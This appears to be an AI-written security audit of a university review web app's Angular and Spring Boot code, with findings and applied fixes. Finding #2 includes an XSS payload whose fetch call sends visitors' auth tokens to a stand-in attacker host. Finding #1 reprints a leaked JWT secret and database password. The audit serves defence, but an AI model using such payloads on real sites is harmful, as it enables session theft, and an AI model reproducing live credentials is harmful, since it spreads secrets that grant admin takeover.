# CurtinHonestly Security Audit — August 2026

**Scope:** Angular SSR frontend + admin frontend, Spring Boot / PostgreSQL backend, deployed on Azure Static Web Apps + Container Apps.
**Reviewer:** automated deep audit (Claude), branch `security/audit-2026-08-remediation`.
**Method:** full read of the auth/authz/review/campaign/admin/rate-limit layers, the SSR SEO rendering path, secret handling, git history, and CI/deploy config. Skeptical, exploit-first.

Overall the codebase is in good shape: JPA is used with parameterised queries throughout (no native SQL, no string-built queries), Angular template binding escapes all user content in the DOM, password storage is bcrypt, verification/reset tokens are 256-bit, SHA-256-hashed, single-use and TTL-bounded, and admin endpoints are gated server-side. The findings below are the real gaps.

---

## Severity summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **Critical** | JWT signing secret (and DB password) committed to a **public** git history; forgeable admin tokens if still in use | Fixed-in-code already; **Devon must rotate** |
| 2 | **Critical** | Stored XSS via JSON-LD `reviewBody` in prerendered/SSR HTML | **Fixed** on this branch |
| 3 | **High** | Rate-limit bypass via spoofable `X-Forwarded-For` (defeats login/reset/register/visit limits) | **Fixed** on this branch |
| 4 | **Medium** | Password reset does not invalidate existing JWTs (up to 7-day window) | **Fixed** on this branch (Flyway `V5`) |
| 5 | **Medium** | Verification-confirm token travels in URL query string; auto-logs-in | **Fixed** on this branch (partial by nature, see below) |
| 6 | **Low** | `isTipOwner` repeats the old `instanceof UserDetails` bug — denies every non-admin tip owner (fail-closed) | **Fixed** on this branch |
| 7 | **Low** | Account enumeration on `/auth/register` ("email already registered") | **Fixed** on this branch (residual noted) |
| 8 | **Low** | No minimum password length on registration (reset enforces 8) | **Fixed** on this branch |
| 9 | **Low** | `professor` review field has no length bound (storage/DoS) | **Fixed** on this branch |
| 10 | **Info** | Actuator on classpath; keep web exposure to `health` only | Hardening note |

---

## 1. Critical — Signing secret committed to public git history

**Files:** git history of `backend/src/main/resources/application.yml` (removed in commit `0eed46b`, still present in commits `bf450b0` / `a69aa39`). Current file at `backend/src/main/resources/application.yml:54` correctly reads `jwt.secret: ${jwt-secret:?...}`.

**What's exposed:** the repository `https://github.com/devon-clarkk/CurtinHonestly.git` is **PUBLIC** (`gh repo view` → `PUBLIC`). Its history contains:
- `jwt.secret: tG4Mz8q7Rs2Lp9FnXKp7dWsYmYeTb4H3`
- datasource `password: CurtinHonestly`

**Concrete exploit:** the JWT filter authenticates by the token's `subject` and then loads authorities from the DB for that email (`JwtAuthenticationFilter.java:42-55`, `UserDetailsServiceImpl.java`). So anyone who knows the HS256 secret can mint a token with `subject = <any admin's email>` and immediately gets `ROLE_ADMIN` — full admin takeover (delete users/reviews/units, read every user's email, dump campaign entrants). The secret is public. If the production `JWT_SECRET` env var is still `tG4Mz8q7...`, the site is compromised right now.

**Fix (code):** already done in `0eed46b` — the secret is no longer in source and is required from env. Nothing to change in code.

**Devon action items (cannot be done from code):**
1. **Rotate `JWT_SECRET` in prod (and dev) to a fresh 256-bit random value** — e.g. `openssl rand -base64 48`. Rotating invalidates all existing tokens (acceptable; users log in again). Do this even if you think prod already uses a different value, because you cannot prove the exposed one was never deployed.
2. **Rotate the database password** `CurtinHonestly` if it was ever the real prod/dev credential.
3. Optional but recommended: purge the secrets from history (`git filter-repo`) or accept that they are permanently public and rely on rotation. Rotation is the load-bearing step.

---

## 2. Critical — Stored XSS via JSON-LD in server-rendered HTML

**Files:** `frontend/src/app/services/seo.service.ts:128-140` (`setJsonLd`), `frontend/src/app/utils/unit-seo.utils.ts:69-87` (`buildReviewJsonLd` → `reviewBody: review.reviewText.trim()`), invoked unconditionally from `frontend/src/app/components/unit-detail/unit-detail.component.ts:189` during data load. Unit pages are `RenderMode.Prerender` (`frontend/src/app/app.routes.server.ts`), so this runs at build/SSR time with live review data.

**The sink:**
```ts
script.textContent = JSON.stringify(data);   // data.reviewBody = attacker's reviewText
```

**Why it's exploitable:** in the browser, assigning `.textContent` is inert (no re-parse). The danger is the **server-side render**. `<script>` is a *raw-text* HTML element: a conformant HTML serializer emits its text content **verbatim, without entity-encoding**, because entities inside raw-text elements are not decoded by parsers. `JSON.stringify` does **not** escape `<`, `>`, or `/`. So a review whose text contains:

```
</script><img src=x onerror="fetch('//evil/?c='+localStorage.auth_token)">
```

is serialized literally into the prerendered `units/<CODE>/index.html`. When any visitor loads that page, their parser closes the JSON-LD `<script>` early and executes the injected markup. This is **stored XSS affecting every visitor** of the poisoned unit page, and the auth JWT lives in `localStorage` (`auth.service.ts:145`), so it is directly exfiltratable. `reviewText` allows 2000 chars (`ReviewCreateRequest`), far more than a payload needs, and the profanity filter does not strip HTML.

Note the mechanism does not depend on which DOM library Angular 21 uses — raw-text serialization is required by the HTML spec, which is exactly why the fix must happen in the JSON string.

**Confirmation:** confirmed by mechanism (spec-level). I could not observe the prod-built artifact directly because the checked-in `frontend/dist` is a dev build (`seoEnabled=false`, so `setJsonLd` is short-circuited and no unit pages are prerendered locally). On a prod build (`SITE_URL` set, `unit-codes.json` populated), the path runs.

**Fix (code, applied):** a new `serializeJsonLd` helper (`unit-seo.utils.ts`) escapes the three HTML-significant characters in the serialized JSON before it is assigned to `textContent`. A JSON parser decodes `<` back to `<` for JSON-LD consumers, while the raw HTML string no longer contains `</script>`:
```ts
export function serializeJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, '\u003c')
    .replace(/>/g, '\u003e')
    .replace(/&/g, '\u0026');
}
```
`&` is escaped so the sequence can't be reconstituted via an entity; `<`/`>` are the actual breakout characters. (U+2028/U+2029 don't need escaping here: they are legal inside JSON strings, and this output is parsed as JSON-LD, not as an ECMAScript literal.) Regression tests added asserting a `</script>` payload, both directly and carried through `buildUnitJsonLd`, never appears literally in the output.

---

## 3. High — Rate-limit bypass via spoofable `X-Forwarded-For`

**File:** `backend/src/main/java/com/curtinhonestly/backend/security/RateLimitFilter.java:84-90`.

```java
String forwardedFor = request.getHeader("X-Forwarded-For");
if (forwardedFor != null && !forwardedFor.isBlank()) {
    return forwardedFor.split(",")[0].trim();   // leftmost = client-controlled
}
```

**Exploit:** the rate-limit key is `clientIp + ":" + path`. The leftmost `X-Forwarded-For` value is whatever the client sends — a proxy *appends* the real IP to the right, it does not overwrite the left. So an attacker sets `X-Forwarded-For: <random>` on each request and every request keys to a distinct bucket, giving **unlimited** requests. This defeats *all* the auth protections that motivate this filter: login credential-stuffing (10/min), password-reset and verification email bombing (5/10min), registration bot signups, and referral visit-count inflation.

**Fix (code, applied), made fail-safe:** resolve the client IP from the right of the `X-Forwarded-For` chain using a configurable trusted-hop count (`app.ratelimit.trusted-proxy-count`, default `1` for the single Container Apps ingress hop), and fall back to `getRemoteAddr()` whenever the resolved value is blank or the header is absent. Failing safe matters: if the hop count is wrong the worst case is that traffic keys on the ingress IP (over-throttling), never silent bypass. Test added proving a spoofed leftmost XFF no longer changes the key.

**Assumption to verify (Devon):** the fix relies on the ingress *appending* the real client IP to the right of any client-supplied `X-Forwarded-For` (the standard behaviour, and what Container Apps ingress does). If a proxy instead forwarded a client-supplied header untouched, the rightmost entry would be attacker-controlled. The unit test constructs the header itself, so it proves the code handles the assumed shape but cannot prove the platform produces it. Confirm once on dev: send a request with a forged `X-Forwarded-For: 1.1.1.1` and check which value the app resolves (log it, or observe the rate-limit bucket). If the platform passes the client header through, set `app.ratelimit.trusted-proxy-count=0` so the socket address is used. This is a config change, no redeploy of code needed.

**Note:** the limiter is in-memory per replica (`RateLimiter.java` comment). With more than one backend replica the limits are per-instance; a shared store (Redis) would be needed for correctness at scale. Out of scope for this pass — noted.

---

## 4. Medium — Password reset / email change does not invalidate existing sessions

**Files:** `VerificationService.resetPassword` (`:154-178`), `UserService.updateEmail` (`:90-115`). JWTs are stateless with a 7-day TTL (`JwtUtil.java:24`) and authorities are re-read from the DB per request, but there is no per-user "credentials changed at" check.

**Exploit:** a user who resets their password after a device theft or token leak does not actually cut off the attacker — the previously issued JWT remains valid for up to 7 days. The reset gives false assurance.

**Fix (code, applied):** `User.tokensValidAfter` (nullable `TIMESTAMPTZ`, added by `V5__app_users_tokens_valid_after.sql`), stamped by `VerificationService.resetPassword` and `UserService.updateEmail`, enforced in `JwtAuthenticationFilter`: a token whose `iat` predates the stamp is refused before authentication is set, even though it is still correctly signed and unexpired.

Three details are load-bearing:

- **The column is nullable, not `NOT NULL DEFAULT now()`.** Adding a `NOT NULL` column to a populated table without a default is precisely the `reviews.like_count` failure this repo's `db/migration/README.md` documents, and a `DEFAULT now()` backfill would have logged out every existing user on deploy. `NULL` means "no cut-off", so pre-existing accounts are untouched until they actually change a credential.
- **The stamp is truncated to whole seconds.** A JWT `iat` carries whole seconds only. `PATCH /auth/me` stamps the cut-off and mints a replacement token in the same instant, so a nanosecond-precision stamp would be strictly newer than that fresh token and the filter would reject it, logging the user out the moment they changed their email. The comparison is a strict `issuedAt.isBefore(cutOff)` so a same-second token survives.
- **The cut-off rides on the `UserDetails`.** `UserDetailsServiceImpl` now returns `AppUserDetails` (a subclass of Spring's `User`), so the filter reads the timestamp from the lookup it already performs rather than adding a second query per request.

Residual: the window is one second wide. A token minted in the same second as the reset is accepted. Closing that would require sub-second `iat`, which JWT does not carry.

---

## 5. Medium — Verification-confirm token in URL, auto-login

**Files:** `AuthController.confirmStudentVerification` (`:145-154`) — `GET /auth/verify-student/confirm?token=...` returns a fresh JWT; email body builds `/verify-student/confirm?token=<raw>` (`VerificationService.java:189`).

**Risk:** tokens in URLs leak via `Referer` headers (to any third-party asset on the landing page), browser history, and proxy/server logs. Because confirming also **logs the user in** (issues a JWT), a leaked-then-still-unused token grants a session. Mitigated by single-use + 256-bit entropy + 24h TTL, so exposure is low, but the pattern is worth changing: prefer POST-on-confirm from the SPA (token in body) or invalidate immediately and never echo a session token from a GET.

**Fix (code, applied):**

- `GET /auth/verify-student/confirm?token=...` is **replaced** by `POST /auth/verify-student/confirm` with the token in the request body. The GET is gone rather than deprecated: leaving a second, leakier entry point that also auto-logs-in would keep the finding open. The response carries `Cache-Control: no-store`.
- Both landing pages (`/verify-student/confirm` and `/reset-password`) strip the token from the address bar as soon as they have read it, via `Router.navigate(..., { replaceUrl: true })`. `replaceUrl` keeps it out of browser history instead of pushing a second entry that still holds it. Router navigation rather than `history.replaceState` because it stays correct if either route ever moves off `RenderMode.Client` (both resolve to the `'**'` client entry in `app.routes.server.ts` today), where a bare `window.history` reference would break under SSR.

  **Accepted cost:** reloading the reset page after the strip loses the token, so a user who opens the link, starts typing, and then refreshes or has the tab restored must request a fresh link. Standard for reset pages, and cheaper than leaving a live credential in history and in the `Referer` of every later request. Worth knowing before it arrives as a support question.

  Verified in a browser against the dev server, since no test covers this: loading `/reset-password?token=...` leaves the URL at `/reset-password` with an empty query string **and still renders the password form** rather than the "this reset link is missing its token" branch, and `/verify-student/confirm?token=...` strips likewise and issues `POST http://localhost:8080/auth/verify-student/confirm` with no token in the request URL. That "still renders the form" half is the point: a strip that also cleared the component's copy of the token would break every reset with the whole test suite green.
- `index.html` pins `<meta name="referrer" content="strict-origin-when-cross-origin">`, so the token cannot reach a third-party host in a `Referer` header even on a browser whose default is laxer.
- `SecurityConfig` permits the new POST route unauthenticated (the recipient may open the link on a device that is not signed in). The rate-limit entry moved with it and **must stay above** the `POST /auth/verify-student` prefix rule: both are now POST, matching is first-hit, and with the order reversed a legitimate confirm would be charged to the 5-per-10-minutes email-send bucket. There is a regression test for that ordering.

**What necessarily stays:** the emailed link itself carries the token in a URL, because it is a link in an email. Everything downstream of the click no longer does. The reset flow's backend was already clean (the token travels in the `POST /auth/reset-password` body), so the backend change here is confirm-only.

**Stale-tab caveat:** a user who had the verify page open in a tab from before the deploy would have an old bundle calling the removed GET. They get the error state and can request a fresh link.

**Optional hardening for Devon (config, not code):** `staticwebapp.config.json` `globalHeaders` could add a site-wide `Referrer-Policy` to complement the meta tag. Left alone deliberately, per the split of code work from config work.

---

## 6. Low — `isTipOwner` denies every non-admin tip owner (same bug the review path just fixed)

**File:** `backend/src/main/java/com/curtinhonestly/backend/service/UnitTipSecurityService.java:15-27`.

```java
public boolean isTipOwner(String tipId, Object principal) {
    if (principal instanceof UserDetails) { ... }   // never true
    return false;
}
```

The SpEL `IS_ADMIN_OR_TIP_OWNER` passes `authentication` (a `UsernamePasswordAuthenticationToken`), which is **not** a `UserDetails`, so the `instanceof` is always false and the method always returns `false`. This is the identical mistake `ReviewSecurityService` documents having fixed. Effect: `DELETE /units/{code}/tips/{tipId}` returns 403 for every non-admin, so a user **cannot delete their own tip** (admins still can).

This fails **closed** — it is a correctness/availability bug, not an unauthorized-access vulnerability. Rated Low accordingly, but it lives squarely in the ownership-check area under audit and the fix mirrors the review path.

**Fix (code, applied):** read the username off `authentication.getName()` (matching `ReviewSecurityService`), compare to the tip's author email; anonymized tips (null user) remain unclaimable. Tests added: owner can delete, other user gets 403, admin can delete.

---

## 7. Low — Account enumeration on registration

**File:** `UserService.createUser` → `"That email is already registered."` surfaced via `GlobalExceptionHandler` as a 400, while a new address got a 200. Lets an attacker probe which emails have accounts. `forgot-password` is correctly enumeration-safe; registration was not.

**Fix (code, applied):** `POST /auth/register` now returns a byte-identical `200 {"message": ...}` in both cases.

- `UserService.createUser` throws a new `EmailAlreadyRegisteredException` (a subclass of `IllegalArgumentException`, so every other caller and the 400 mapping are unchanged) and `AuthController.register` catches exactly that one type. Unrelated registration failures, such as a bad referral slug or promo code, still surface as errors: they are not a signal about email addresses, and swallowing them would hide a real mistake from the user.
- **Registration no longer returns a session token.** This is forced: a token can only be minted for an account we just created, so returning one in exactly one of the two branches would be the same oracle in a different field. The SPA completes signup by calling `/auth/login` immediately afterwards with the credentials just entered, which keeps the one-submit UX, and `/auth/login` is already enumeration-safe.
- **The duplicate branch still runs bcrypt** before throwing, and the result is discarded. A uniform body is defeated by a stopwatch if the create path spends ~100ms hashing and the duplicate path returns instantly. Parity is close, not perfect: the create path also does an insert, and a student-suffix address triggers a verification email, so the branches are not identical in cost. Perfect timing parity is not achievable here and is not claimed.
- **The real owner is emailed** ("someone tried to sign up with your email"), which is the standard companion to an enumeration-safe signup: the person who owns the address learns about the attempt, the person who made it learns nothing. This also restores, to the right recipient, the signal that the removed error message used to give the wrong one.
- The controller no longer logs the submitted email on this path, since a log line keyed to the outcome is the same oracle moved into a log file.

**Residual, stated plainly:** an attacker can still infer existence by registering an address and then attempting to log in with the password they chose. Success means the account was new. That is inherent to any signup that produces an immediately usable account, and closing it requires activation-before-login, which is a product decision (see Devon action items) and not something this pass takes on its own initiative. What this fix removes is the free, single-request, unambiguous oracle.

**Campaign path checked:** with attribution, `registerUserWithCampaign` takes the campaign row lock and validates state before `createUser`, so a duplicate email throws inside that transaction and it rolls back. No redemption slot is consumed and no `CampaignEntry` is created.

**Note (out of scope, unchanged):** `PATCH /auth/me` still answers `"That email is already in use."` That is an authenticated endpoint, so probing it costs an account and is rate-limited by that, but it is the same class of signal if it ever matters.

---

## 8. Low — No minimum password length at registration

**File:** `AuthController.RegisterRequest` (`:171`) — `@NotBlank String password` only. A user can register with a 1-character password, while `VerificationService.resetPassword` enforces 8 (`:36,155`). Inconsistent and weak.

**Fix (code, applied):** add `@Size(min = 8)` to the registration password to match the reset policy.

---

## 9. Low — Unbounded `professor` field

**Files:** `ReviewCreateRequest` / `ReviewUpdateRequest` — `String professor` has no `@Size`. Every other free-text field is bounded (`reviewText` 2000, tip 200, note 500). Unbounded storage / minor DoS vector.

**Fix (code, applied):** `@Size(max = 200)` on `professor` in both `ReviewCreateRequest` and `ReviewUpdateRequest`. 200 (not a tighter cap) and applied identically on create and update so that an already-stored long professor string can never make a review un-editable — a create-only or tighter bound would 400 a legitimate edit of pre-existing data.

---

## 10. Info — Actuator hardening

`spring-boot-starter-actuator` is on the classpath (`backend/build.gradle:30`). `SecurityConfig` permits only `/actuator/health`; all other actuator paths fall through to `.anyRequest().authenticated()`, and Spring Boot's default web exposure is `health` only, so nothing sensitive is exposed today. Keep it that way: do not set `management.endpoints.web.exposure.include=*`, and if more endpoints are ever exposed, gate them behind `ROLE_ADMIN` explicitly.

---

## Things checked and found sound (no action)

- **SQL injection:** no native queries; all `@Query` are JPQL with named params; filtering uses JPA Specifications (`UnitSpecification`). No string-concatenated SQL.
- **XSS in the DOM:** no `innerHTML`, no `bypassSecurityTrust*`, no `DomSanitizer` bypass anywhere in either frontend. Review/tip/professor text renders through Angular interpolation (`{{ }}`), which HTML-escapes. Newline rendering uses CSS `white-space: pre-line` (`unit-detail.component.css:379`), not markup injection — safe. (The one exception is the JSON-LD path, finding #2.)
- **Review ownership (the reported bug):** `ReviewSecurityService.isReviewOwner` is correct — it compares `authentication.getName()` to the review author's email and returns true only for the actual owner; it did **not** over-correct into letting the wrong user edit. `#id` in the SpEL matches the `@PathVariable String id`. Verified by added tests (owner edits/deletes, other user 403, admin allowed).
- **Anonymity of reviews:** public DTOs (`ReviewDTO`, `MyReviewDTO`, `UnitDetailsDTO`, `TipDTO`) expose only a `reviewerVerified`/`authorVerified` boolean and never the author email or user id. Author email appears only in `AdminReviewDTO` / `CampaignEntryAdminDTO`, both behind `ROLE_ADMIN`. No public endpoint leaks reviewer identity.
- **Admin authz:** `/admin/**` requires `ROLE_ADMIN` in `SecurityConfig` *and* the controller carries a class-level `@PreAuthorize`. `GET /reviews`/`/reviews/**` and `/users`/`/users/**` are admin-gated; `/reviews/me` and `/users/me/completed-units` are correctly carved out first (first-match-wins ordering is right).
- **Ban enforcement:** `UserDetailsServiceImpl` sets `enabled = !banned` and the JWT filter re-checks `userDetails.isEnabled()` on every request, so a ban takes effect immediately rather than at token expiry. Authorities always come from the DB, never the token's `roles` claim — good.
- **Password hashing:** `BCryptPasswordEncoder`. `password` is `@JsonIgnore` on the entity.
- **Token flows:** 256-bit `SecureRandom` raw tokens, stored only as SHA-256 hashes, single-use (`usedAt`), TTL-bounded (24h verify / 1h reset), outstanding tokens invalidated on reissue, ownership re-checked at confirm time. Forgot-password is enumeration-safe.
- **CORS:** exact-origin allowlist per environment (`application.yml` / `application-prod.yml`), no wildcard origin. `allowCredentials(true)` is unnecessary (auth is a Bearer header, not cookies) but not exploitable with an exact allowlist.
- **Error handling:** `GlobalExceptionHandler` returns generic messages and logs stack traces server-side; unexpected exceptions never leak internals to clients.
- **SPA fallback / 404 fix:** `staticwebapp.config.json` `navigationFallback` rewrites unknown routes to `index.html` with a static-asset exclude list and `X-Content-Type-Options: nosniff`. No path traversal or source exposure introduced.
- **Prod-build SEO generator:** `frontend/scripts/generate-seo-assets.js` (runs in the same prod build pipeline as finding #2) emits only `robots.txt` and `sitemap.xml`. The sitemap contains just `<loc>` URLs built from `encodeURIComponent(code)` and `lastmod` dates — no review text, professor, or other user-controlled content reaches the output, so it is not an injection sink. `fetch-unit-codes.js` likewise pulls only unit codes.
- **Campaign / referral abuse:** admin-only creation is enforced (`AdminResource` under `ROLE_ADMIN`); `landingPath` is normalised to a site-relative path (rejects `://` and `//`, strips query/fragment) so a referral link can't be turned into an open redirect; the redemption race is closed with a `SELECT … FOR UPDATE` row lock; entry-token collisions are retried. Visit endpoint is IP-rate-limited (subject to finding #3).

---

## What was changed on this branch

**First pass (Critical + High + cheap Lows), commit `c57754d`:**
- **#2** JSON-LD escaping via new `serializeJsonLd` in `unit-seo.utils.ts`, wired into `seo.service.ts` + regression tests.
- **#3** `X-Forwarded-For` right-of-chain resolution with trusted-hop config (`app.ratelimit.trusted-proxy-count`, default 1), fail-safe fallback + tests.
- **#6** `isTipOwner` corrected + ownership tests (review and tip).
- **#8** registration password `@Size(min = 8)`.
- **#9** `professor` `@Size(max = 200)` on create and update.

**Second pass (the deferred Mediums and Low), this commit:**
- **#4** `V5__app_users_tokens_valid_after.sql` + `User.tokensValidAfter`, stamped on password reset and email change, enforced in `JwtAuthenticationFilter` via the new `AppUserDetails`.
- **#5** confirm endpoint moved from `GET ?token=` to `POST` with the token in the body; both token-bearing SPA routes strip it from the URL; referrer-policy meta tag; `Cache-Control: no-store` on the confirm response; rate-limit entry re-ordered to match.
- **#7** `EmailAlreadyRegisteredException` + uniform `200` from `/auth/register`, register-then-login in the SPA, bcrypt on the duplicate branch for timing parity, notice emailed to the real owner.

Nothing in the Devon-owned column (secret rotation, environment config) was touched.

**Test status:** 137 backend tests, 134 green. New this pass: `JwtSessionInvalidationTest` (6, including the same-second acceptance case that guards against the fix logging users out), `SessionInvalidationIntegrationTest` (2, against a real Postgres, proving the migration and column round-trip and that the filter turns the cut-off into a 401), `RegisterEnumerationTest` (5), `VerifyStudentConfirmEndpointTest` (3), plus new cases in `UserServiceTest`, `VerificationServiceTest`, `RateLimitFilterTest`, `ExceptionHandlerTest`, and `EmailNormalizationTest`. Frontend: 73 unit tests green and `ng build` clean (including the prerender step).

The same three `@SpringBootTest` tests still fail (`ApplicationTests.contextLoads`, `ReviewLikeCampaignTest`, `ReviewOrderingTest`). Re-confirmed pre-existing this pass by stashing every change and running them on the clean base, where they fail identically. `ApplicationTests` fails on `password authentication failed for user "postgres"` (it does not import `TestcontainersConfig`, so it tries the local DB); the other two fail on an assertion, `201` expected but `400`. Both are unrelated to this work. Devon should confirm CI's view before promoting.

Committed, **not deployed**. Deployment is Devon's dev→main promotion.

## Devon action items (cannot be fixed in code)

1. **Rotate `JWT_SECRET`** in prod and dev to a fresh 256-bit random value (finding #1). Highest priority.
2. **Rotate the DB password** if `CurtinHonestly` was ever a real credential (finding #1).
3. **Verify the `X-Forwarded-For` shape on dev** (finding #3) and set `app.ratelimit.trusted-proxy-count` accordingly (0 if the ingress does not append). One-time check.
4. Consider a shared rate-limit store (Redis) if the backend ever runs more than one replica (finding #3 note).
5. **Decide whether to close finding #7's residual** by requiring email activation before a new account can log in. That removes the last inference path, at the cost of adding a confirmation step to signup. It is a conversion trade-off, so it is your call rather than a security default. Everything cheaper than that is already done.
6. Optional: add a site-wide `Referrer-Policy` to `staticwebapp.config.json` `globalHeaders` alongside the meta tag (finding #5).
7. Watch the first deploy after **#4**: the migration adds a nullable column, so no existing session is invalidated by the deploy itself. If sessions do start dropping, the cause is the truncation or comparison direction, not the migration.

   Note what the test suite does and does not prove about `V5`. Every container-backed test starts on a fresh database, so `to_regclass('public.app_users')` is NULL, the migration no-ops, and Hibernate creates the column from the entity. The `ALTER TABLE ... ADD COLUMN IF NOT EXISTS` branch therefore only ever executes on your dev and prod databases, which have the table already. This is the same situation as `V2`–`V4` and the statement is safe (nullable, `IF NOT EXISTS`, inside the existence guard), but it is untested by construction, so the dev boot is the first real exercise of it.
